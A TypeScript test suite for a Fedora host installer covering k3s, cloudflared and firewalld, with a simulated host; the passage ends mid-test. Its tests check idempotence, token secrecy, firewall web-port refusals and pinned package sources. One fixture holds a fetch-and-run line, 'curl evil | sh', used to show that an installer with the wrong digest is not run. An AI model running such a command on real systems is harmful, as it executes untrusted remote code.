// The installer against a simulated host: a clean host converges in one run, a second run
// changes nothing, refusals leave the host untouched, and the tunnel token never appears in a
// command line or the output.
import { describe, expect, test } from "bun:test";
import { randomBytes } from "node:crypto";
import {
  CLOUDFLARE_KEY_PATH,
  CLOUDFLARED_REPO,
  CLOUDFLARED_REPO_PATH,
  CREDSTORE,
  K3S_CONFIG,
  K3S_CONFIG_PATH,
  MARKER,
  credentialPath,
  renderUnit,
  unitPath,
} from "../src/desired.ts";
import {
  type InstallOptions,
  InstallError,
  install,
  parseFirewallInfo,
  parseListeners,
  richRuleOpensWebPort,
} from "../src/install.ts";
import { TokenError } from "../src/token.ts";
import { FAKE_INSTALLER_SHA256, FakeHost } from "./fake-host.ts";

// Made up at run time: the tests check that these values never reach a command line or the output.
const PLANTED = randomBytes(32).toString("base64");
const TUNNEL_ID = "0b6c1c3e-4a59-4f33-9d55-5b8a2d7f9e10";
const TOKEN = makeToken(TUNNEL_ID, PLANTED);
const OTHER_TOKEN = makeToken(TUNNEL_ID, randomBytes(32).toString("base64"));

function makeToken(tunnelId: string, secret: string): string {
  return Buffer.from(JSON.stringify({ a: "4f1d0e9c8b7a6f5e4d3c2b1a09f8e7d6", t: tunnelId, s: secret })).toString("base64");
}

function options(overrides: Partial<InstallOptions> = {}): InstallOptions {
  return {
    unit: "cloudflared",
    token: new TextEncoder().encode(`${TOKEN}\n`),
    skipK3s: false,
    reconfigureK3s: false,
    reinstallCloudflared: false,
    dryRun: false,
    ...overrides,
  };
}

function run(host: FakeHost, opts: InstallOptions = options()) {
  return install(host, opts, host.log, { k3sInstallerSha256: FAKE_INSTALLER_SHA256 });
}

/** A host where a previous run of the installer finished. */
async function installedHost(): Promise<FakeHost> {
  const host = new FakeHost();
  await run(host);
  host.commands = [];
  host.output = [];
  host.mutations = 0;
  return host;
}

describe("clean host", () => {
  test("one run installs and configures everything", async () => {
    const host = new FakeHost();
    host.runtime.get("FedoraServer")?.services.add("https");
    host.permanent.get("FedoraServer")?.ports.add("80/tcp");
    const result = await run(host);

    expect(host.packages).toContain("firewalld");
    expect(host.packages).toContain("cloudflared");
    expect(host.packages).toContain("k3s-selinux");
    expect(host.units.get("firewalld")).toEqual({ enabled: true, active: true });
    expect(host.units.get("k3s")).toEqual({ enabled: true, active: true });
    expect(host.units.get("cloudflared")).toEqual({ enabled: true, active: true });

    expect(host.text(K3S_CONFIG_PATH)).toBe(K3S_CONFIG);
    expect(host.files.get(K3S_CONFIG_PATH)?.mode).toBe(0o600);
    expect(host.text(CLOUDFLARED_REPO_PATH)).toBe(CLOUDFLARED_REPO);
    expect(host.text(CLOUDFLARE_KEY_PATH)).toContain("BEGIN PGP PUBLIC KEY BLOCK");
    expect(host.text(unitPath("cloudflared"))).toBe(renderUnit("cloudflared"));
    expect(host.directories.get(CREDSTORE)?.mode).toBe(0o700);
    expect(host.text(credentialPath("cloudflared"))).toBe(TOKEN);
    expect(host.files.get(credentialPath("cloudflared"))?.mode).toBe(0o600);

    for (const zone of [host.runtime, host.permanent]) {
      expect([...(zone.get("trusted")?.sources ?? [])]).toEqual(["10.42.0.0/16"]);
      // Pods are trusted except for the host's sshd.
      expect([...(zone.get("trusted")?.richRules ?? [])]).toEqual([
        'rule family="ipv4" source address="10.42.0.0/16" port port="22" protocol="tcp" reject',
      ]);
      expect(zone.get("FedoraServer")?.services.has("https")).toBe(false);
      expect(zone.get("FedoraServer")?.ports.has("80/tcp")).toBe(false);
    }
    // The installer ran from a temporary directory that is gone afterwards.
    expect(host.commands).toContainEqual(["sh", "/var/tmp/trustiot-host-install.test/k3s-install.sh"]);
    expect([...host.files.keys()].some((path) => path.startsWith("/var/tmp/"))).toBe(false);

    expect(result.exposure).toBe(1.1);
    expect(host.output).toContain("  check: nothing listens on TCP or UDP 80 or 443");
    expect(host.output).toContain(`  tunnel token: tunnel ${TUNNEL_ID}`);
  });

  test("a second run changes nothing and restarts nothing", async () => {
    const host = await installedHost();
    const result = await run(host);
    expect(result.changes).toEqual([]);
    expect(host.mutations).toBe(0);
    expect(host.commands.some(([program, verb]) => program === "systemctl" && verb === "restart")).toBe(false);
  });

  test("a second run without a token keeps the stored one", async () => {
    const host = await installedHost();
    const result = await run(host, options({ token: null }));
    expect(result.changes).toEqual([]);
    expect(host.output).toContain(`  tunnel token: kept the one in ${credentialPath("cloudflared")} (tunnel ${TUNNEL_ID})`);
  });

  test("--dry-run plans every change and makes none", async () => {
    const host = new FakeHost();
    const result = await run(host, options({ dryRun: true }));
    expect(host.mutations).toBe(0);
    expect(result.changes.length).toBeGreaterThan(5);
    expect(host.output.filter((line) => line.startsWith("+ ")).every((line) => line.startsWith("+ would "))).toBe(true);
    expect(host.files.has(credentialPath("cloudflared"))).toBe(false);
  });
});

describe("the tunnel token", () => {
  test("never appears in a command line or the output", async () => {
    const host = new FakeHost();
    await run(host);
    await run(host, options({ token: new TextEncoder().encode(OTHER_TOKEN) }));
    const commandLines = host.commands.map((command) => command.join(" ")).join("\n");
    const output = host.output.join("\n");
    for (const secret of [TOKEN, OTHER_TOKEN, PLANTED]) {
      expect(commandLines).not.toContain(secret);
      expect(output).not.toContain(secret);
    }
  });

  test("a new token replaces the stored one and restarts cloudflared", async () => {
    const host = await installedHost();
    const result = await run(host, options({ token: new TextEncoder().encode(OTHER_TOKEN) }));
    expect(host.text(credentialPath("cloudflared"))).toBe(OTHER_TOKEN);
    expect(host.files.get(credentialPath("cloudflared"))?.mode).toBe(0o600);
    expect(host.commands).toContainEqual(["systemctl", "restart", "cloudflared.service"]);
    expect(result.changes).toHaveLength(2);
  });

  test("a malformed token is refused before anything changes", async () => {
    const host = new FakeHost();
    const promise = run(host, options({ token: new TextEncoder().encode("cloudflared service install abc") }));
    await expect(promise).rejects.toBeInstanceOf(TokenError);
    expect(host.mutations).toBe(0);
  });

  test("a first run without a token is refused before anything changes", async () => {
    const host = new FakeHost();
    await expect(run(host, options({ token: null }))).rejects.toThrow(/no tunnel token/);
    expect(host.mutations).toBe(0);
  });

  test.each([
    ["without a token", null],
    ["with the same token", new TextEncoder().encode(TOKEN)],
  ])("a stored token readable by others is restricted to root on a run %s", async (_name, token) => {
    const host = await installedHost();
    const file = host.files.get(credentialPath("cloudflared"));
    if (file) {
      file.mode = 0o644;
      file.uid = 1000;
    }
    await run(host, options({ token }));
    expect(host.files.get(credentialPath("cloudflared"))).toMatchObject({ mode: 0o600, uid: 0 });
    // Same content: no restart.
    expect(host.commands.some(([program, verb]) => program === "systemctl" && verb === "restart")).toBe(false);
  });
});

describe("existing hosts", () => {
  test("a cloudflared unit the installer did not write is left untouched", async () => {
    const host = new FakeHost();
    const foreign = "[Service]\nExecStart=/usr/bin/cloudflared tunnel run --token-file /etc/cloudflared/token\n";
    host.files.set(unitPath("cloudflared"), { data: new TextEncoder().encode(foreign), mode: 0o644, uid: 0 });
    await expect(run(host)).rejects.toThrow(/was not written by this installer/);
    expect(host.text(unitPath("cloudflared"))).toBe(foreign);
    expect(host.mutations).toBe(0);
  });

  test("another unit name installs next to a foreign cloudflared unit", async () => {
    const host = new FakeHost();
    const foreign = "[Service]\nExecStart=/usr/bin/cloudflared tunnel run\n";
    host.files.set(unitPath("cloudflared"), { data: new TextEncoder().encode(foreign), mode: 0o644, uid: 0 });
    host.markActive("cloudflared");
    await run(host, options({ unit: "cloudflared-trustiot" }));
    expect(host.text(unitPath("cloudflared"))).toBe(foreign);
    expect(host.text(unitPath("cloudflared-trustiot"))).toBe(renderUnit("cloudflared-trustiot"));
    expect(host.text(credentialPath("cloudflared-trustiot"))).toBe(TOKEN);
    expect(host.commands.some((command) => command.includes("cloudflared.service") && command[1] !== "is-active" && command[1] !== "is-enabled")).toBe(false);
  });

  test("a different k3s config is refused unless --reconfigure-k3s or --skip-k3s", async () => {
    const original = "disable:\n  - traefik\n";
    const host = await installedHost();
    host.files.set(K3S_CONFIG_PATH, { data: new TextEncoder().encode(original), mode: 0o600, uid: 0 });

    await expect(run(host)).rejects.toThrow(/--reconfigure-k3s/);
    expect(host.mutations).toBe(0);

    await run(host, options({ skipK3s: true }));
    expect(host.text(K3S_CONFIG_PATH)).toBe(original);
    // Only read: the network check asks the API server, nothing restarts k3s.
    expect(host.commands.some((command) => command[0] === "systemctl" && command.at(-1) === "k3s" && command[1] !== "is-active")).toBe(false);
    expect(host.commands.some(([program]) => program === "sh")).toBe(false);

    await run(host, options({ reconfigureK3s: true }));
    expect(host.text(K3S_CONFIG_PATH)).toBe(K3S_CONFIG);
    expect(host.text(`${K3S_CONFIG_PATH}.bak-20261010T000000Z`)).toBe(original);
    expect(host.commands).toContainEqual(["systemctl", "restart", "k3s"]);
  });

  test.each([
    ["a custom pod network", (host: FakeHost) => void (host.podCidrs = "10.244.0.0/24")],
    ["a custom service network", (host: FakeHost) => void (host.serviceIps = "10.96.0.1")],
    ["dual-stack", (host: FakeHost) => void (host.podCidrs = "10.42.0.0/24 fd00:10:42::/64")],
  ])("an existing cluster with %s is refused before anything changes", async (_name, configure) => {
    const host = await installedHost();
    configure(host);
    for (const skipK3s of [false, true]) {
      await expect(run(host, options({ token: null, skipK3s }))).rejects.toThrow(/does not use the networks the firewall trusts/);
    }
    expect(host.mutations).toBe(0);
  });

  test("a newly installed cluster with other networks fails before cloudflared is set up", async () => {
    const host = new FakeHost();
    host.podCidrs = "10.244.0.0/24";
    await expect(run(host)).rejects.toThrow(/pod network 10.244.0.0\/24/);
    expect(host.files.has(credentialPath("cloudflared"))).toBe(false);
  });

  test("a new node that is Ready before its pod network is assigned is waited for", async () => {
    // Seen on a clean Fedora Cloud 44 VM on 2026-10-10: Ready one second after the node object
    // was created, with spec.podCIDRs still empty.
    const host = new FakeHost();
    host.podCidrsPending = 2;
    await run(host);
    expect(host.podCidrsPending).toBe(0);
    expect(host.units.get("cloudflared")?.active).toBe(true);
  });

  test("a running k3s that would not start at boot is enabled", async () => {
    const host = await installedHost();
    host.units.set("k3s", { enabled: false, active: true });
    await run(host, options({ token: null }));
    expect(host.units.get("k3s")).toEqual({ enabled: true, active: true });
    expect(host.commands).toContainEqual(["systemctl", "enable", "k3s"]);
  });

  test("--skip-k3s needs a running k3s", async () => {
    await expect(run(new FakeHost(), options({ skipK3s: true }))).rejects.toThrow(/installed and running/);
  });

  test("--skip-k3s together with --reconfigure-k3s is a usage error", async () => {
    await expect(run(new FakeHost(), options({ skipK3s: true, reconfigureK3s: true }))).rejects.toBeInstanceOf(InstallError);
  });

  test("cloudflared is installed only from the pinned repository", async () => {
    const host = new FakeHost();
    await run(host);
    expect(host.commands).toContainEqual(["dnf", "install", "-y", "--repo=cloudflared-stable", "cloudflared"]);
    expect(host.text(CLOUDFLARED_REPO_PATH)).toContain("gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-cloudflare-packaging");
  });

  test.each([
    [
      "Cloudflare's own instructions, at the installer's path",
      CLOUDFLARED_REPO_PATH,
      "[cloudflared-stable]\nbaseurl=https://pkg.cloudflare.com/cloudflared/rpm\ngpgcheck=1\ngpgkey=https://pkg.cloudflare.com/cloudflare-ascii-pubkey.gpg\n",
    ],
    [
      "another file for Cloudflare's repository",
      "/etc/yum.repos.d/cloudflare-main.repo",
      "[cloudflare]\nbaseurl=https://pkg.cloudflare.com/cloudflared/rpm\ngpgcheck=0\n",
    ],
    ["a mirror with the same repository id", "/etc/yum.repos.d/mirror.repo", "[cloudflared-stable]\nbaseurl=https://mirror.example.com/\n"],
  ])("a repository definition from %s is refused before anything changes", async (_name, path, content) => {
    const host = new FakeHost();
    host.files.set(path, { data: new TextEncoder().encode(content), mode: 0o644, uid: 0 });
    await expect(run(host)).rejects.toThrow(/not written by this installer but defining Cloudflare's package repository/);
    expect(host.text(path)).toBe(content);
    expect(host.mutations).toBe(0);
  });

  test.each([
    ["a downloaded RPM", { fromRepo: "@commandline", signature: "(none)" }],
    ["another repository", { fromRepo: "copr-cloudflared", signature: "RSA/SHA256, Key ID 1234567890abcdef" }],
    ["the right repository id but another signer", { fromRepo: "cloudflared-stable", signature: "RSA/SHA256, Key ID 1234567890abcdef" }],
  ])("a cloudflared installed from %s is refused before anything changes", async (_name, provenance) => {
    const host = new FakeHost();
    host.packages.add("cloudflared");
    host.provenance.set("cloudflared", provenance);
    host.files.set("/usr/bin/cloudflared", { data: new TextEncoder().encode(""), mode: 0o755, uid: 0 });
    await expect(run(host)).rejects.toThrow(/did not come from the pinned repository/);
    expect(host.mutations).toBe(0);
  });

  test.each([
    ["the same version is in the repository", true, "reinstall"],
    ["the repository has another version", false, "distro-sync"],
  ])("--reinstall-cloudflared replaces it with the signed package when %s", async (_name, sameVersion, verb) => {
    const host = new FakeHost();
    host.packages.add("cloudflared");
    host.provenance.set("cloudflared", { fromRepo: "@commandline", signature: "(none)" });
    host.files.set("/usr/bin/cloudflared", { data: new TextEncoder().encode(""), mode: 0o755, uid: 0 });
    host.repositoryHasInstalledVersion = sameVersion;
    await run(host, options({ reinstallCloudflared: true }));
    const dnf = host.commands.filter(([program, command]) => program === "dnf" && command !== "repoquery");
    expect(dnf.at(-1)).toEqual(["dnf", verb, "-y", "--repo=cloudflared-stable", "cloudflared"]);
    expect(host.provenance.get("cloudflared")?.fromRepo).toBe("cloudflared-stable");
    expect(host.units.get("cloudflared")).toEqual({ enabled: true, active: true });
    // The repository with the pinned key was in place before dnf ran.
    expect(host.text(CLOUDFLARED_REPO_PATH)).toBe(CLOUDFLARED_REPO);
  });

  test("a different key at the signing key path is refused before anything changes", async () => {
    const host = new FakeHost();
    const other = "-----BEGIN PGP PUBLIC KEY BLOCK-----\nsomeone else's key\n-----END PGP PUBLIC KEY BLOCK-----\n";
    host.files.set(CLOUDFLARE_KEY_PATH, { data: new TextEncoder().encode(other), mode: 0o644, uid: 0 });
    await expect(run(host)).rejects.toThrow(/holds a different key/);
    expect(host.text(CLOUDFLARE_KEY_PATH)).toBe(other);
    expect(host.mutations).toBe(0);
  });

  test("k3s without its SELinux policy is refused before anything changes", async () => {
    const host = await installedHost();
    host.packages.delete("k3s-selinux");
    host.units.set("firewalld", { enabled: false, active: false });
    await expect(run(host, options({ token: null }))).rejects.toThrow(/k3s-selinux/);
    expect(host.mutations).toBe(0);
  });

  test("a signed cloudflared too old for --token-file is refused before anything changes", async () => {
    const host = await installedHost();
    host.cloudflaredHasTokenFile = false;
    host.units.set("firewalld", { enabled: false, active: false });
    await expect(run(host, options({ token: null }))).rejects.toThrow(/no --token-file option/);
    expect(host.mutations).toBe(0);
  });

  test("unrelated repository files are left alone", async () => {
    const host = new FakeHost();
    const rancher = "[rancher-k3s-common-stable]\nbaseurl=https://rpm.rancher.io/k3s/stable/common/centos/8/noarch\ngpgcheck=1\n";
    host.files.set("/etc/yum.repos.d/rancher-k3s-common.repo", { data: new TextEncoder().encode(rancher), mode: 0o644, uid: 0 });
    await run(host);
    expect(host.text("/etc/yum.repos.d/rancher-k3s-common.repo")).toBe(rancher);
  });

  test("an older version of the installer's own files is updated", async () => {
    const host = await installedHost();
    const stale = `${MARKER}\n[Service]\nExecStart=/usr/bin/cloudflared tunnel run\n`;
    host.files.set(unitPath("cloudflared"), { data: new TextEncoder().encode(stale), mode: 0o644, uid: 0 });
    await run(host);
    expect(host.text(unitPath("cloudflared"))).toBe(renderUnit("cloudflared"));
    expect(host.commands).toContainEqual(["systemctl", "daemon-reload"]);
    expect(host.commands).toContainEqual(["systemctl", "restart", "cloudflared.service"]);
  });
});

describe("file ownership and type", () => {
  test.each([
    ["the cloudflared unit", unitPath("cloudflared"), 0o644],
    ["the k3s config", K3S_CONFIG_PATH, 0o600],
    ["the repository file", CLOUDFLARED_REPO_PATH, 0o644],
    ["the signing key", CLOUDFLARE_KEY_PATH, 0o644],
  ])("%s writable by another user gets root ownership and its mode back", async (_name, path, mode) => {
    const host = await installedHost();
    const file = host.files.get(path);
    if (file) {
      file.mode = 0o666;
      file.uid = 1000;
    }
    const result = await run(host, options({ token: null }));
    expect(host.files.get(path)).toMatchObject({ mode, uid: 0 });
    expect(result.changes).toEqual([`restore owner root:root and mode 0${mode.toString(8)} on ${path}`]);
  });

  test("the credential store readable by others gets mode 0700 back", async () => {
    const host = await installedHost();
    const store = host.directories.get(CREDSTORE);
    if (store) store.mode = 0o755;
    await run(host, options({ token: null }));
    expect(host.directories.get(CREDSTORE)?.mode).toBe(0o700);
  });

  test("a symbolic link where the unit belongs is refused", async () => {
    const host = await installedHost();
    host.symlinks.add(unitPath("cloudflared"));
    await expect(run(host, options({ token: null }))).rejects.toThrow(/is a symlink, not a regular file/);
  });
});

describe("refusals and checks", () => {
  test("SELinux not enforcing stops the run before any change", async () => {
    const host = new FakeHost();
    host.selinux = "Permissive";
    await expect(run(host)).rejects.toThrow(/SELinux is Permissive/);
    expect(host.mutations).toBe(0);
  });

  test.each([
    ["is the default zone", (host: FakeHost) => void (host.defaultZone = "trusted")],
    ["holds a network interface", (host: FakeHost) => void host.permanent.get("trusted")?.interfaces.add("eth0")],
    ["trusts another source", (host: FakeHost) => void host.runtime.get("trusted")?.sources.add("0.0.0.0/0")],
    [
      "is the permanent default zone",
      (host: FakeHost) =>
        void host.files.set("/etc/firewalld/firewalld.conf", {
          data: new TextEncoder().encode("# comment\nDefaultZone=trusted\n"),
          mode: 0o644,
          uid: 0,
        }),
    ],
  ])("a trusted zone that %s stops the run before any change", async (_name, breakTrustedZone) => {
    const host = await installedHost();
    breakTrustedZone(host);
    await expect(run(host, options({ token: null }))).rejects.toThrow(/trusted zone accepts all traffic/);
    expect(host.mutations).toBe(0);
  });

  test("a stopped firewalld whose configuration trusts everything is not started", async () => {
    const host = new FakeHost();
    host.packages.add("firewalld");
    host.units.set("firewalld", { enabled: false, active: false });
    host.permanent.get("trusted")?.interfaces.add("eth0");
    await expect(run(host)).rejects.toThrow(/trusted zone holds the interfaces eth0 \(permanent\)/);
    expect(host.units.get("firewalld")).toEqual({ enabled: false, active: false });
    expect(host.mutations).toBe(0);
  });

  test("a stopped firewalld is configured offline and only then started", async () => {
    const host = new FakeHost();
    host.packages.add("firewalld");
    host.units.set("firewalld", { enabled: false, active: false });
    host.permanent.get("public")?.services.add("https");
    await run(host);
    const start = host.commands.findIndex((command) => command.join(" ") === "systemctl enable --now firewalld");
    const lastOffline = host.commands.findLastIndex(([program]) => program === "firewall-offline-cmd");
    expect(lastOffline).toBeLessThan(start);
    expect(host.commands.slice(0, start).some(([program, ...args]) => program === "firewall-offline-cmd" && args.includes("--remove-service=https"))).toBe(true);
    // Started from the cleaned permanent configuration, nothing to change at runtime.
    expect(host.runtime.get("public")?.services.has("https")).toBe(false);
    expect(host.commands.slice(start).some(([program, ...args]) => program === "firewall-cmd" && args.some((arg) => arg.startsWith("--remove-")))).toBe(false);
  });

  test("a stopped firewalld with a port range covering 443 is not started", async () => {
    const host = new FakeHost();
    host.packages.add("firewalld");
    host.units.set("firewalld", { enabled: false, active: false });
    host.permanent.get("public")?.ports.add("400-500/tcp");
    await expect(run(host)).rejects.toThrow(/port range 400-500\/tcp/);
    expect(host.units.get("firewalld")).toEqual({ enabled: false, active: false });
  });

  test("a freshly installed firewalld is checked offline before it starts", async () => {
    const host = new FakeHost();
    await run(host);
    const offline = host.commands.findIndex(([program]) => program === "firewall-offline-cmd");
    const start = host.commands.findIndex((command) => command.join(" ") === "systemctl enable --now firewalld");
    expect(offline).toBeGreaterThanOrEqual(0);
    expect(offline).toBeLessThan(start);
  });

  test("the service network, which an older setup trusted, is removed from the trusted zone", async () => {
    const host = await installedHost();
    for (const zones of [host.runtime, host.permanent]) zones.get("trusted")?.sources.add("10.43.0.0/16");
    await run(host, options({ token: null }));
    for (const zones of [host.runtime, host.permanent]) {
      expect([...(zones.get("trusted")?.sources ?? [])]).toEqual(["10.42.0.0/16"]);
    }
  });

  test("a firewalld that cannot list its policies stops the run", async () => {
    const host = await installedHost();
    host.policiesSupported = false;
    await expect(run(host, options({ token: null }))).rejects.toThrow(/--get-policies failed/);
    expect(host.mutations).toBe(0);
  });

  test("web ports are closed in inactive zones too, and other services stay", async () => {
    const host = await installedHost();
    host.permanent.get("public")?.services.add("http");
    host.runtime.get("work")?.ports.add("443/udp");
    await run(host, options({ token: null }));
    expect(host.permanent.get("public")?.services.has("http")).toBe(false);
    expect(host.runtime.get("work")?.ports.has("443/udp")).toBe(false);
    expect([...(host.runtime.get("FedoraServer")?.services ?? [])].sort()).toEqual(["cockpit", "ssh"]);
    expect(host.runtime.get("work")?.ports.has("1025-65535/tcp")).toBe(true);
  });

  test("a port range covering 80 or 443 stops the run", async () => {
    const host = await installedHost();
    host.permanent.get("public")?.ports.add("1-1024/tcp");
    await expect(run(host, options({ token: null }))).rejects.toThrow(/zone public \(permanent\) opens the port range 1-1024\/tcp, which can open TCP or UDP 80 or 443/);
  });

  test.each([
    [
      "a rich rule accepting 443",
      (host: FakeHost) => void host.permanent.get("public")?.richRules.add('rule family="ipv4" source address="192.0.2.0/24" port port="443" protocol="tcp" accept'),
      /has the rich rule/,
    ],
    [
      "a rich rule accepting the http service",
      (host: FakeHost) => void host.runtime.get("work")?.richRules.add('rule family="ipv4" service name="http" accept'),
      /has the rich rule/,
    ],
    [
      "a forwarded port 80",
      (host: FakeHost) => void host.permanent.get("public")?.forwardPorts.add("port=80:proto=tcp:toport=8080:toaddr="),
      /forwards port=80/,
    ],
    ["a custom service with 443", (host: FakeHost) => void host.runtime.get("FedoraServer")?.services.add("web-alt"), /allows the service web-alt/],
    [
      "a bound zone with target ACCEPT",
      (host: FakeHost) => {
        host.targets.set("work", "ACCEPT");
        host.permanent.get("work")?.interfaces.add("eth1");
      },
      /zone work \(permanent\) has the target ACCEPT/,
    ],
    ["a policy into the host with target ACCEPT", (host: FakeHost) => void host.targets.set("allow-host-ipv6", "ACCEPT"), /policy allow-host-ipv6/],
    ["a direct rule", (host: FakeHost) => void (host.directRules = "ipv4 filter INPUT 0 -p tcp --dport 443 -j ACCEPT\n"), /has direct rules/],
  ])("%s stops the run before any change", async (_name, configure, message) => {
    const host = await installedHost();
    configure(host);
    await expect(run(host, options({ token: null }))).rejects.toThrow(message);
    expect(host.mutations).toBe(0);
  });

  test("an unbound zone with target ACCEPT, like Fedora's nm-shared, is fine", async () => {
    const host = await installedHost();
    for (const zones of [host.runtime, host.permanent]) {
      zones.set("nm-shared", {
        services: new Set(["dhcp", "dns", "ssh"]),
        ports: new Set(),
        sources: new Set(),
        interfaces: new Set(),
        richRules: new Set(['rule priority="32767" reject']),
        forwardPorts: new Set(),
      });
    }
    host.targets.set("nm-shared", "ACCEPT");
    host.servicePorts.dhcp = ["67/udp"];
    host.servicePorts.dns = ["53/tcp", "53/udp"];
    const result = await run(host, options({ token: null }));
    expect(result.changes).toEqual([]);
  });

  test.each([
    ["the current default zone", "runtime"],
    ["the default zone in firewalld.conf", "config"],
  ])("%s with target ACCEPT stops the run even with nothing bound", async (_name, where) => {
    // The default zone takes every interface that is bound to no zone.
    const host = await installedHost();
    host.targets.set("work", "ACCEPT");
    if (where === "runtime") host.defaultZone = "work";
    else host.files.set("/etc/firewalld/firewalld.conf", { data: new TextEncoder().encode("DefaultZone=work\n"), mode: 0o644, uid: 0 });
    await expect(run(host, options({ token: null }))).rejects.toThrow(/zone work .* target ACCEPT/);
    expect(host.mutations).toBe(0);
  });

  test("rich rules that refuse web ports and other rich rules are fine", async () => {
    const host = await installedHost();
    host.permanent.get("public")?.richRules.add('rule family="ipv4" source address="192.0.2.0/24" port port="443" protocol="tcp" reject');
    host.permanent.get("public")?.richRules.add('rule family="ipv4" source address="192.0.2.0/24" service name="ssh" accept');
    const result = await run(host, options({ token: null }));
    expect(result.changes).toEqual([]);
  });

  test("each zone and policy is read with one --info call, not one call per field", async () => {
    const host = await installedHost();
    await run(host, options({ token: null }));
    const listCalls = host.commands.filter((cmd) =>
      cmd.some((arg) => /^--list-(services|ports|forward-ports|rich-rules)$/.test(arg)),
    );
    expect(listCalls).toEqual([]);
  });

  test("a zone description in an unknown layout stops the run before any change", async () => {
    const host = new FakeHost();
    host.packages.add("firewalld");
    host.infoFormat = "unknown";
    await expect(run(host)).rejects.toThrow(/its description has no "[a-z -]+" field/);
    expect(host.mutations).toBe(0);
  });

  test("web services are removed from policies too", async () => {
    const host = await installedHost();
    host.policies.get("allow-host-ipv6")?.services.add("https");
    await run(host, options({ token: null }));
    expect(host.policies.get("allow-host-ipv6")?.services.has("https")).toBe(false);
  });

  test("an unsupported OS stops the run", async () => {
    const host = new FakeHost();
    host.files.set("/etc/os-release", { data: new TextEncoder().encode("ID=debian\nPRETTY_NAME=Debian\n"), mode: 0o644, uid: 0 });
    await expect(run(host)).rejects.toThrow(/unsupported OS Debian/);
  });

  test("the k3s installer is not run when its digest does not match", async () => {
    const host = new FakeHost();
    host.installerBytes = new TextEncoder().encode("#!/bin/sh\ncurl evil | sh\n");
    await expect(run(host)).rejects.toThrow(/not running it/);
    expect(host.commands.some(([program]) => program === "sh")).toBe(false);
  });

  test("a listener on 443 fails the run", async () => {
    const host = await installedHost();
    host.listeners.push('LISTEN 0 4096 *:443 *:* users:(("envoy",pid=4242,fd=30))');
    await expect(run(host)).rejects.toThrow(/listens on web ports: TCP \*:443 envoy/);
  });

  test("a UDP listener on 443 fails the run", async () => {
    const host = await installedHost();
    host.udpListeners.push('UNCONN 0 0 0.0.0.0:443 0.0.0.0:* users:(("quic-server",pid=77,fd=3))');
    await expect(run(host, options({ token: null }))).rejects.toThrow(/UDP 0.0.0.0:443 quic-server/);
  });

  test("a pod publishing host port 80 fails the run", async () => {
    const host = await installedHost();
    host.podHostPorts += "default/web-1 8080 80\n";
    await expect(run(host, options({ token: null }))).rejects.toThrow(/pods publish a host port 80 or 443: default\/web-1/);
  });

  test("an exposure above 2.0 fails the run", async () => {
    const host = await installedHost();
    host.exposure = 9.6;
    await expect(run(host)).rejects.toThrow(/exposure of 9.6, above 2/);
  });
});

describe("richRuleOpensWebPort", () => {
  const portsOf = async (service: string) => ({ ssh: ["22/tcp"], "web-alt": ["8080/tcp", "443/tcp"] })[service] ?? [];
  test.each([
    ['rule family="ipv4" port port="443" protocol="tcp" accept', true],
    ['rule family="ipv4" port port="400-500" protocol="udp" accept', true],
    ['rule family="ipv4" service name="https" accept', true],
    ['rule family="ipv4" service name="web-alt" accept', true],
    ['rule family="ipv4" port port="443" protocol="tcp" log prefix="drop " level="info" accept', true],
    ['rule family="ipv4" forward-port port="80" protocol="tcp" to-port="8080"', true],
    ['rule family="ipv4" source address="192.0.2.0/24" forward-port port="443" protocol="tcp" to-port="8443" to-addr="10.0.0.2"', true],
    ['rule family="ipv4" port port="443" protocol="tcp" reject', false],
    ['rule family="ipv4" port port="443" protocol="tcp" log prefix="accept" drop', false],
    ['rule family="ipv4" service name="ssh" accept', false],
    ['rule family="ipv4" port port="8443" protocol="tcp" accept', false],
    ['rule family="ipv4" forward-port port="8080" protocol="tcp" to-port="80"', false],
  ])("%s → %p", async (rule, expected) => {
    expect(await richRuleOpensWebPort(rule, portsOf)).toBe(expected);
  });
});

describe("parseFirewallInfo", () => {
  test("reads firewalld 2.4's --info-zone output, multi-line fields included", () => {
    // Captured with `firewall-cmd --info-zone=work` on Fedora Cloud 44 (firewalld 2.4.4).
    const info = parseFirewallInfo(
      [
        "work",
        "  target: default",
        "  ingress-priority: 0",
        "  egress-priority: 0",
        "  icmp-block-inversion: no",
        "  interfaces: ",
        "  sources: ",
        "  services: dhcpv6-client mdns ssh",
        "  ports: 1000-1001/tcp",
        "  protocols: ",
        "  forward: yes",
        "  masquerade: no",
        "  forward-ports: ",
        "\tport=8080:proto=tcp:toport=80:toaddr=",
        "\tport=8443:proto=tcp:toport=443:toaddr=10.0.0.1",
        "  source-ports: ",
        "  icmp-blocks: ",
        "  rich rules: ",
        '\trule family="ipv4" source address="1.2.3.4" accept',
        '\trule service name="http" log prefix="a b" accept',
        "",
      ].join("\n"),
    );
    expect(info.get("target")).toEqual(["default"]);
    expect(info.get("interfaces")).toEqual([]);
    expect(info.get("services")).toEqual(["dhcpv6-client", "mdns", "ssh"]);
    expect(info.get("ports")).toEqual(["1000-1001/tcp"]);
    expect(info.get("forward-ports")).toEqual(["port=8080:proto=tcp:toport=80:toaddr=", "port=8443:proto=tcp:toport=443:toaddr=10.0.0.1"]);
    expect(info.get("rich rules")).toEqual(['rule family="ipv4" source address="1.2.3.4" accept', 'rule service name="http" log prefix="a b" accept']);
  });

  test("reads a policy and an active zone's header", () => {
    const info = parseFirewallInfo(
      "allow-host-ipv6 (active)\n  disable: no\n  priority: -15000\n  target: CONTINUE\n  ingress-zones: ANY\n  egress-zones: HOST\n" +
        '  services: \n  rich rules: \n\trule family="ipv6" icmp-type name="redirect" accept\n',
    );
    expect(info.get("egress-zones")).toEqual(["HOST"]);
    expect(info.get("rich rules")).toEqual(['rule family="ipv6" icmp-type name="redirect" accept']);
    expect(info.has("allow-host-ipv6 (active)")).toBe(false);
  });

  test("an entry line without a field is refused", () => {
    expect(() => parseFirewallInfo("work\n\tport=80:proto=tcp:toport=8080:toaddr=\n")).toThrow(InstallError);
  });
});

describe("parseListeners", () => {
  test("reads addresses, ports and processes from ss -Htlnp", () => {
    const listeners = parseListeners(
      [
        'LISTEN 0      128          0.0.0.0:22         0.0.0.0:*    users:(("sshd",pid=938,fd=6))',
        'LISTEN 0      4096               *:6443             *:*    users:(("k3s-server",pid=18161,fd=12))',
        'LISTEN 0      128             [::]:22            [::]:*    users:(("sshd",pid=938,fd=7))',
        'LISTEN 0      4096      127.0.0.53%lo:53         0.0.0.0:*    users:(("systemd-resolve",pid=607,fd=13))',
        "",
      ].join("\n"),
    );
    expect(listeners).toEqual([
      { address: "0.0.0.0", port: 22, process: "sshd" },
